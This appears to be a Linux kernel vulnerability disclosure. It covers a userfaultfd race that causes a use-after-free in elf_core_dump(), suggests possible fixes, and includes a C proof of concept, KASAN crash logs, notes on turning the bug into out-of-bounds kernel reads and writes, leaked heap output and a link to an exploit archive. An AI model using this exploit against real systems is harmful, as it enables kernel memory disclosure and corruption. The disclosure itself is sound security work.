@@ -1,0 +1,293 @@
+elf_core_dump() has a comment back from something like 2.5.43-C3 that says:
+
+        /*
+         * We no longer stop all VM operations.
+         * 
+         * This is because those proceses that could possibly change map_count
+         * or the mmap / vma pages are now blocked in do_exit on current
+         * finishing this core dump.
+         *
+         * Only ptrace can touch these memory addresses, but it doesn't change
+         * the map_count or the pages allocated. So no possibility of crashing
+         * exists while dumping the mm->vm_next areas to the core file.
+         */
+
+However, since commit 86039bd3b4e6 ("userfaultfd: add new syscall to provide
+memory externalization", introduced in v4.3), that's no longer true; the
+following functions can call vma_merge() on another task's VMAs while holding
+the corresponding mmap_sem for writing:
+
+ - userfaultfd_release() [->release handler]
+ - userfaultfd_register() [invoked via ->unlocked_ioctl handler]
+ - userfaultfd_unregister() [invoked via ->unlocked_ioctl handler]
+
+This means that VMAs can disappear from under elf_core_dump().
+
+
+I see two potential ways to fix this, but I'm not sure whether either of them is
+good:
+
+1. Let elf_core_dump() hold a read lock on the mmap_sem across the page-dumping
+   loop. This would mean that the mmap_sem can be blocked indefinitely by a
+   userspace process, and e.g. userfaultfd_release() could block the task or
+   global workqueue it's running on (depending on where the final fput()
+   happened) indefinitely, which seems potentially bad from a denial-of-service
+   perspective?
+2. Let coredump_wait() set a flag on the mm_struct before dropping the mmap_sem
+   that says "this mm_struct is going away, keep your hands off";
+   let the userfaultfd ioctl handlers check for the flag and bail out as if the
+   mm_struct was already dead;
+   hack userfaultfd_release() so that it only calls vma_merge() if the flag
+   hasn't been set;
+   and because I feel icky about concurrent reads and writes of bitmasks without
+   explicit annotations, either make the vm_flags accesses in
+   userfaultfd_release() and in everything called from elf_core_dump() atomic
+   (because userfaultfd_release will clear bits in them concurrently with reads
+   from elf_core_dump()) or let elf_core_dump() take the mmap_sem for reading
+   while looking at vm_flags.
+   If the fix goes in this direction, it should probably come with a big warning
+   on top of the definition of mmap_sem, or something like that.
+
+
+Here's a simple proof-of-concept:
+======================================================================
+user@debian:~/uffd_coredump$ cat coredump_helper.c
+#include <unistd.h>
+#include <stdlib.h>
+#include <err.h>
+#include <stdbool.h>
+
+int main(void) {
+  char buf[1024];
+  size_t total = 0;
+  bool slept = false;
+  while (1) {
+    int res = read(0, buf, sizeof(buf));
+    if (res == -1) err(1, "read");
+    if (res == 0) return 0;
+    total += res;
+    if (total > 1024*1024 && !slept) {
+      sleep(10);
+      slept = true;
+    }
+  }
+}
+user@debian:~/uffd_coredump$ gcc -o coredump_helper coredump_helper.c
+user@debian:~/uffd_coredump$ cat set_helper.sh 
+#!/bin/sh
+echo "|$(realpath ./coredump_helper)" > /proc/sys/kernel/core_pattern
+user@debian:~/uffd_coredump$ sudo ./set_helper.sh 
+user@debian:~/uffd_coredump$ cat dumpme.c 
+#define _GNU_SOURCE
+#include <string.h>
+#include <stdlib.h>
+#include <linux/userfaultfd.h>
+#include <sys/ioctl.h>
+#include <sys/syscall.h>
+#include <err.h>
+#include <unistd.h>
+#include <sys/mman.h>
+
+int main(void) {
+  // set up an area consisting of half normal anon memory, half present userfaultfd region
+  void *area = mmap(NULL, 1024*1024*2, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+  if (area == MAP_FAILED) err(1, "mmap");
+  memset(area, 'A', 1024*1024*2);
+  int uffd = syscall(__NR_userfaultfd, 0);
+  if (uffd == -1) err(1, "userfaultfd");
+  struct uffdio_api api = { .api = 0xAA, .features = 0 };
+  if (ioctl(uffd, UFFDIO_API, &api)) err(1, "API");
+  struct uffdio_register reg = {
+    .range = { .start = (unsigned long)area+1024*1024, .len = 1024*1024 },
+    .mode = UFFDIO_REGISTER_MODE_MISSING
+  };
+  if (ioctl(uffd, UFFDIO_REGISTER, &reg)) err(1, "REGISTER");
+
+  // spawn a child that can do stuff with the userfaultfd
+  pid_t child = fork();
+  if (child == -1) err(1, "fork");
+  if (child == 0) {
+    sleep(3);
+    if (ioctl(uffd, UFFDIO_UNREGISTER, &reg.range)) err(1, "UNREGISTER");
+    exit(0);
+  }
+
+  *(volatile char *)0 = 42;
+}
+user@debian:~/uffd_coredump$ gcc -o dumpme dumpme.c
+user@debian:~/uffd_coredump$ ./dumpme 
+Segmentation fault (core dumped)
+user@debian:~/uffd_coredump$ 
+======================================================================
+
+dmesg output:
+======================================================================
+[  128.977354] dumpme[1116]: segfault at 0 ip 0000563e14789a6e sp 00007ffed407cd80 error 6 in dumpme[563e14789000+1000]
+[  128.979600] Code: ff 85 c0 74 16 48 8d 35 d7 00 00 00 bf 01 00 00 00 b8 00 00 00 00 e8 c1 fc ff ff bf 00 00 00 00 e8 c7 fc ff ff b8 00 00 00 00 <c6> 00 2a b8 00 00 00 00 c9 c3 0f 1f 84 00 00 00 00 00 41 57 41 56
+[  138.988465] ==================================================================
+[  138.992696] BUG: KASAN: use-after-free in elf_core_dump+0x2063/0x20e0
+[  138.994168] Read of size 8 at addr ffff8881e616ed60 by task dumpme/1116
+
+[  138.996163] CPU: 1 PID: 1116 Comm: dumpme Not tainted 5.0.0-rc8 #292
+[  138.997591] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014
+[  138.999570] Call Trace:
+[  139.000237]  dump_stack+0x71/0xab
+[...]
+[  139.001940]  print_address_description+0x6a/0x2b0
+[...]
+[  139.005026]  kasan_report+0x14e/0x192
+[...]
+[  139.006803]  elf_core_dump+0x2063/0x20e0
+[...]
+[  139.013876]  do_coredump+0x1072/0x17a0
+[...]
+[  139.027534]  get_signal+0x93c/0xa90
+[  139.028400]  do_signal+0x85/0xb20
+[...]
+[  139.034068]  exit_to_usermode_loop+0xfb/0x120
+[...]
+[  139.036028]  prepare_exit_to_usermode+0x95/0xb0
+[  139.037114]  retint_user+0x8/0x8
+[  139.037884] RIP: 0033:0x563e14789a6e
+[  139.038661] Code: ff 85 c0 74 16 48 8d 35 d7 00 00 00 bf 01 00 00 00 b8 00 00 00 00 e8 c1 fc ff ff bf 00 00 00 00 e8 c7 fc ff ff b8 00 00 00 00 <c6> 00 2a b8 00 00 00 00 c9 c3 0f 1f 84 00 00 00 00 00 41 57 41 56
+[  139.042892] RSP: 002b:00007ffed407cd80 EFLAGS: 00010202
+[  139.044148] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 00007f654198538b
+[  139.045809] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000001200011
+[  139.047405] RBP: 00007ffed407cdd0 R08: 00007f6541e6f700 R09: 00007ffed407cdae
+[  139.049063] R10: 00007f6541e6f9d0 R11: 0000000000000246 R12: 0000563e14789770
+[  139.050659] R13: 00007ffed407ceb0 R14: 0000000000000000 R15: 0000000000000000
+
+[  139.052673] Allocated by task 1116:
+[  139.053506]  __kasan_kmalloc.constprop.9+0xa0/0xd0
+[  139.054600]  kmem_cache_alloc+0xd6/0x1e0
+[  139.055561]  vm_area_alloc+0x1b/0x80
+[  139.056339]  mmap_region+0x4db/0xa60
+[  139.057179]  do_mmap+0x44d/0x6f0
+[  139.057953]  vm_mmap_pgoff+0x163/0x1b0
+[  139.058936]  ksys_mmap_pgoff+0x16a/0x330
+[  139.059839]  do_syscall_64+0x73/0x160
+[  139.060633]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+
+[  139.062270] Freed by task 1117:
+[  139.062957]  __kasan_slab_free+0x130/0x180
+[  139.063906]  kmem_cache_free+0x73/0x1c0
+[  139.064829]  __vma_adjust+0x564/0xca0
+[  139.065756]  vma_merge+0x358/0x6a0
+[  139.066504]  userfaultfd_ioctl+0x687/0x17c0
+[  139.067533]  do_vfs_ioctl+0x134/0x8f0
+[  139.068377]  ksys_ioctl+0x70/0x80
+[  139.069141]  __x64_sys_ioctl+0x3d/0x50
+[  139.069959]  do_syscall_64+0x73/0x160
+[  139.070755]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+
+[  139.072235] The buggy address belongs to the object at ffff8881e616ed50
+                which belongs to the cache vm_area_struct of size 200
+[  139.075075] The buggy address is located 16 bytes inside of
+                200-byte region [ffff8881e616ed50, ffff8881e616ee18)
+[  139.077556] The buggy address belongs to the page:
+[  139.078648] page:ffffea0007985b00 count:1 mapcount:0 mapping:ffff8881eada6f00 index:0x0 compound_mapcount: 0
+[  139.080745] flags: 0x17fffc000010200(slab|head)
+[  139.081724] raw: 017fffc000010200 ffffea000792dc08 ffffea0007765c08 ffff8881eada6f00
+[  139.083477] raw: 0000000000000000 00000000001d001d 00000001ffffffff 0000000000000000
+[  139.085121] page dumped because: kasan: bad access detected
+
+[  139.086667] Memory state around the buggy address:
+[  139.087695]  ffff8881e616ec00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[  139.089294]  ffff8881e616ec80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[  139.090833] >ffff8881e616ed00: fc fc fc fc fc fc fc fc fc fc fb fb fb fb fb fb
+[  139.092417]                                                        ^
+[  139.093780]  ffff8881e616ed80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[  139.095318]  ffff8881e616ee00: fb fb fb fc fc fc fc fc fc fc fc fc fc fc fc fc
+[  139.096917] ==================================================================
+[  139.098460] Disabling lock debugging due to kernel taint
+======================================================================
+
+################################################################################
+
+ One thing that makes exploitation nice here is that concurrent modification of the number of VMAs throws off the use of the heap-allocated array `vma_filesz`: First vma_filesz is allocated with a size based on the number of VMAs, then it is filled by iterating over the VMAs and writing their calculated sizes into the array (without re-checking against the array's size), and then the function iterates over the VMAs again and dumps the entries in vma_filesz to userspace, again without checking whether the array bounds were exceeded.
+This means that you can use this to:
+
+ - leak in-bounds uninitialized values
+ - leak out-of-bounds data
+ - write out-of-bounds data (with constraints on what can be written)
+
+By using FUSE as source of file mappings and as coredump target (assuming that the system has the upstream default core_pattern), you can pause both the loop that performs out-of-bounds writes as well as the loop that performs out-of-bounds reads, so you should be able to abuse this to write in the middle of newly allocated objects if you want to.
+
+The attached proof-of-concept just demonstrates how you can use this to leak kernel heap data because I didn't want to spend too much time on building a PoC for this.
+
+Usage:
+
+=========================================================================
+user@deb10:~/uffd_core_memdump$ tar cf uffd_core_memdump_clean.tar
+tar: Cowardly refusing to create an empty archive
+Try 'tar --help' or 'tar --usage' for more information.
+user@deb10:~/uffd_core_memdump$ tar cf uffd_core_memdump_clean.tar uffd_core_memdump_clean/
+user@deb10:~/uffd_core_memdump$ cd uffd_core_memdump_clean/
+user@deb10:~/uffd_core_memdump/uffd_core_memdump_clean$ ls
+compile.sh  slowfuse.c  uffd_core_oob.c
+user@deb10:~/uffd_core_memdump/uffd_core_memdump_clean$ ./compile.sh 
+user@deb10:~/uffd_core_memdump/uffd_core_memdump_clean$ ./uffd_core_oob 
+waiting for fuse...
+fuse is up
+got sync 1
+wrote sync 2
+########## getattr(/core)
+########## getattr(/core)
+######## create /core
+########## getattr(/core)
+########## getattr(/core)
+starting tarpit
+got sync 2
+0x0000000000000e3c 0x0000000000000000 0x0000000000000000 0x0000000000001000 
+0x0000000000000000 0x0000000000000000 0x0000000000001000 0x0000000000001000 
+0x0000000000021000 0x0000000000001000 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0x0000000000004000 0x0000000000002000 0x0000000000004000 
+0x0000000000002000 0x0000000000001000 0x0000000000000000 0x0000000000000000 
+0x0000000000001000 0x0000000000001000 0x0000000000001000 0x0000000000021000 
+0x0000000000003000 0x0000000000002000 0xffff9d5e5d354020 0xffff9d5e5d354020 
+0x0000000000000000 0x0000000000000000 0x00007ffe113b5fe8 0x0000000000800000 
+0xffffffffffffffff 0xcbdddcafbd3ba9d1 0x0000000000000000 0x00000001003e0003 
+0x0000000000002c80 0x0000000000000040 0x0000000000006150 0x0038004000000000 
+0x001b001c00400009 0x0000000400000006 0x0000000000000040 0x0000000000000040 
+0x0000000000000040 0x00000000000001f8 0x00000000000001f8 0x0000000000000008 
+0x0000000400000003 0xffff9d5e39c7edd0 0x0000000000000000 0x0000000000000000 
+0x00007fffa1d9dc90 0x0000000000000001 0xffff9d5e421c1300 0x0000000000000000 
+0x0000000000000000 0x0000001100000003 0xffff9d5e5d352020 0xffff9d5e5d352020 
+0x0000000000000000 0x0000000000000000 0x00007fffa1d9efea 0x0000000000800000 
+0xffffffffffffffff 0xcbdddcafbd3bacd1 0x000000000000cccc 0x0000000000000000 
+0x000000000000cdcd 0x0000000000000000 0x000000000000cece 0x0000000000000000 
+0x000000000000cfcf 0x0000000000000000 0x000000000000d0d0 0x0000000000000000 
+0x000000000000d1d1 0x0000000000000000 0x000000000000d2d2 0x0000000000000000 
+0x000000000000d3d3 0x0000000000000000 0x000000000000d4d4 0x0000000000000000 
+0x000000000000d5d5 0x0000000000000000 0x000000000000d6d6 0x0000000000000000 
+0x000000000000d7d7 0x0000000000000000 0x000000000000d8d8 0x0000000000000000 
+0x000000000000d9d9 0x0000000000000000 0x000000000000dada 0x0000000000000000 
+0x000000000000dbdb 0xcbdddcafbd3ba2d1 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0xffff9d5e445b1860 0xffff9d5e445b1860 0x0000000000000000 
+0x0000000000000000 0xffffae0182101000 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0x0000000000000180 0xffff9d5e445b18c8 0xffff9d5e445b18c8 
+0xffffffff90f80b40 0x0000000000000000 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0xcbdddcafbd3ba9d1 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0x0000000000000000 0x0000000000000000 0xffff9d5e6699ccc0 
+0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
+[...]
+0xffff9d5e445ebd58 0xffff9d5e445ebd58 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0x0000000000000000 0x0000000000000000 0xffff9d5e4978d080 
+0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0xffff9d5e5e180c60 0x0000000000000000 0xffff9d5e445ebdd0 
+0xffff9d5e445ebdd0 0xffff9d5e445ebde0 0xffff9d5e445ebde0 0xffff9d5e5d669430 
+0x0000000000000000 0x4cab9d3f81e3f812 0xffffffff91058c10 0xffff9d5e49614f20 
+0xffff9d5e5d406b40 0xffff9d5e5d40a328 0xffffffff91a2ae80 0x0000000000000000 
+0x0000000000000000 0x0008400000220000 0x0000000000000000 0x0000000000000000 
+0xffff9d5e445ebe58 0xffff9d5e445ebe58 0x0000000000000000 0x0000000000000000 
+0x0000000000000000 0x0000000000000000 
+Segmentation fault (core dumped)
+=========================================================================
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/46781.zip
